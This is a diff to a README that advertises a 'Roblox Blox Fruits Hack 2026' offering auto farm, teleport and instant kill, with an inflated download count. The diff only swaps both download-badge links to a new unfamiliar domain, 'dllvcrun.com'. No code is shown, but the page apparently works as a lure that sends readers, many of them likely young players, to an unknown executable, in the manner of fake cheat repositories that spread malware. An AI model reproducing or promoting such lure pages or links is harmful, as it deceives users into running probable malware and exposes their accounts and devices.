@@ -1,6 +1,6 @@
 # Roblox Blox Fruits Hack 2026
 
-[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://connectinstruction.com/rblxblox)
+[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://dllvcrun.com/rblxblox)
 
 > **Roblox Blox Fruits hack — auto farm, teleport, and instant kill for Blox Fruits.**
 
@@ -48,7 +48,7 @@ A: Yes — notifies when rare Devil Fruits spawn nearby.
 
 **Monthly downloads:** 1.4m+
 
-[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://connectinstruction.com/rblxblox)
+[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://dllvcrun.com/rblxblox)
 
 ---
 
